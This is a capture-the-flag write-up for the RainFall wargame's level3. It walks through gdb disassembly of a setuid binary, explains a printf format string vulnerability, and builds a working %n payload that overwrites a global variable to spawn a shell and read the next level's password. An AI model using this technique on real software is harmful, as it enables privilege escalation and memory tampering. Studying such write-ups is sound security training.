# level3

First, let's analyse the binary :

```
level3@RainFall:~$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
level3@RainFall:~$ gdb level3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
(gdb) 
```

Okay. So now it looks like we are not going to exploit a buffer overflow vulnerability : this time the programmer wisely choosed `fgets`, which accepts a size limit, `0x200` in our case. Also, the buffer looks wide enough to accomodate `0x200` bytes : `sub esp,0x218`.

But looking downward a few instructions, he does something extremely unsafe, which is feeding our buffer directly to the `printf` function :

```
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```

Keeping that in mind, let's continue.

```
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
```

These instructions perform an equality check between a value stored at address `0x804988c` and the immediate data `0x40`. We can assume that this is a global variable, located into the data segment.
If this test does not pass, the function simply return, otherwise, it uses the C library call `system` to spawn a shell.

**Our exploit will have to modify the global variable stored at address `0x804988c`, and put the value `0x40` in it in order to have access to the shell.**

But how ?

## String format vulnerability

Remember when i said that feeding a non sanitized user input into a `printf` famility function is a very bad idea ? This is a so called **string format vulnerability**. We allow the user of the application to specify the *format string*. By doing so, we allow the user to read process memory, and even writing to it. One can basically do a full dump of a process memory with a good exploit of a string format vulnerability.

The behaviour of the C format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack. Do note that the format string is also in the stack ! This is the first argument of a format function.

This following input prints 64 32-bit value from the stack :

```
level3@RainFall:~$ python -c 'print("%x "*64)' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a b7fdcb18 0 0 0 3 f63d4e2e 3f3 0 b7e38938 b7fffe78 b7ff9d5c b7e2fe38
```

We can see the contents of the buffer filled by `fgets` (our input), also the size of the buffer that was used by the former function, `0x200`.

But we can even write to memory ! Enter the `%n` specifier :

>%n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the y() before the occurrence of %n.

We can try inputting just a simple `%n` in our program and see what happends :

```
level3@RainFall:~$ gdb level3 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < <(python -c 'print("%n")')
Starting program: /home/user/level3/level3 < <(python -c 'print("%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0x0	0
(gdb) i r eax
eax            0x200	512
(gdb)
```

It segfaults. Analyzing the assembly, it tries to write to memory address `0x200` the value `0x0`. Remember, `0x200` is the first value that was printed using the `%x` specifier. and `0x0` is simply because `printf` has not printed any characters yet.

By specifying multiple conversion specifier, we can *advance* the internal stack pointer of `printf` to choose another value on the stack :

```
level3@RainFall:~$ gdb level3 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < <(python -c 'print("%x%x%n")')
Starting program: /home/user/level3/level3 < <(python -c 'print("%x%x%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0xb	11
(gdb) i r eax
eax            0xb7ff37d0	-1208010800
```

So far, we are using values in the stack that we did not choose to use. But the buffer that `prinf` uses is on the stack ! We can actually choose where we want to write in the process memory :

```
(gdb) run < <(python -c 'print("\xEF\xBE\xAD\xDE" + "%x%x%x%n")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level3/level3 < <(python -c 'print("\xEF\xBE\xAD\xDE" + "%x%x%x%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0x17	23
(gdb) i r eax
eax            0xdeadbeef	-559038737
```

I choosed the format specifier "%x%x%x%n" because we have to *advance* printf's internal stack pointer by 3, so `%n` would write to our `0xDEADBEEF` address.

## Putting it together

- Instead of writing to `0xDEADBEEF`, we can write to the global variable stored at address `0x804988c`.
- We can use the `%n` specifier to store the numbers of character that printf processed.
- We need to write the value `0x40` to address `0x804988c`.

A character is 1 byte wide. Our exploit need to make `printf` process `0x40 (64)` characters before the `%n` specifier.

- The address is 32 bit, so 4 bytes wide.
- Using these conversion specifiers `%08x%08x%08x%n` will output `8*3=24` bytes. Note the usage of a *field width* and *padding characters* to make sure our output is constant in size.

We find how many junk characters we need to fill :

```
x + 4 + 24 = 64
<=> x = 36
```

This is the layout of our exploit in the stack and how many characters will be process by `printf` :

```
[global variable address][junk characters][specifiers]
            4                   36             24
```

Leads to the following python command :

```
python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'
```

Let's try to pipe this command into `level3` with a dummy cat to leave the `stdin` open :

```
level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'; cat) | ./level3
�####################################00000200b7fd1ac0b7ff37d0
Wait what?!
whoami
level4
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
level3@RainFall:~$ 
```

Success !